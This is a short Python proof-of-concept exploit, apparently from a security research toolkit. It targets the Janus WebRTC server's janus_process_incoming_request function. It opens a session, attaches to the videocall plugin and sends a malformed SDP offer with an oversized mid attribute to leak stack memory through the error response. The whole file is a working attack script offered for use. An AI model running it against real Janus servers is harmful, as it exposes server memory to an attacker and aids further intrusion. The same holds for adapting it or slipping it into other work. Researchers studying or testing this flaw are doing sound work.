#!/usr/bin/env python3

# Trigger Stack Memory Leak vulnerability in Janus.
# Vulnerable: janus_process_incoming_request
# python3 ./sdp_stack_memory_leak.py -s http://10.10.10.10 -p 8088

import sys

from utils import JanusPlugin, JanusSession, Exploit

from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack


class ExploitStackMemoryLeak(Exploit):
    def __init__(self, server, port):
        self.url = '{}:{}/janus'.format(server, port)

    async def trigger_sdp_preparse_failed(self,
                       name='konata',
                       plugin_name='janus.plugin.videocall'):
        session = JanusSession(self.url, name)
        await session.create()
        self.log_success('session created')

        plugin = await session.attach(plugin_name)
        self.log_success('attached to {} plugin'.format(plugin_name))

        # pc = RTCPeerConnection()
        # pc.addTrack(VideoStreamTrack())
        # await pc.setLocalDescription(await pc.createOffer())

        sdp = '\n'.join([
            'v=-1',
            'o=aaaa 0 0 IN IP6 cccc',
            's=aaaa',
            't=1 2',
            'c=IN IP4 dddd',
            'm=audio 1 ffff 0',
            'a=mid:{}\n'.format('A' * 17),
        ])
        self.log_info('malicious sdp is created')

        self.log_info('sending malicious offer...')
        response = await plugin.send({
            "body": {
            },
            "jsep": {
                "sdp": sdp,
                "type": 'offer'
            }
        })

        self.log_success('leak: {}'.format(response['error']))

        sys.exit(0)

    def exploit(self):
        super().exploit(tasks=[
            (self.trigger_sdp_preparse_failed, ())
        ])


if __name__ == '__main__':
    server, port = Exploit.parse_args()
    if server is None or port is None:
        log.error('invalid arguments')

    exp = ExploitStackMemoryLeak(server, port)
    exp.exploit()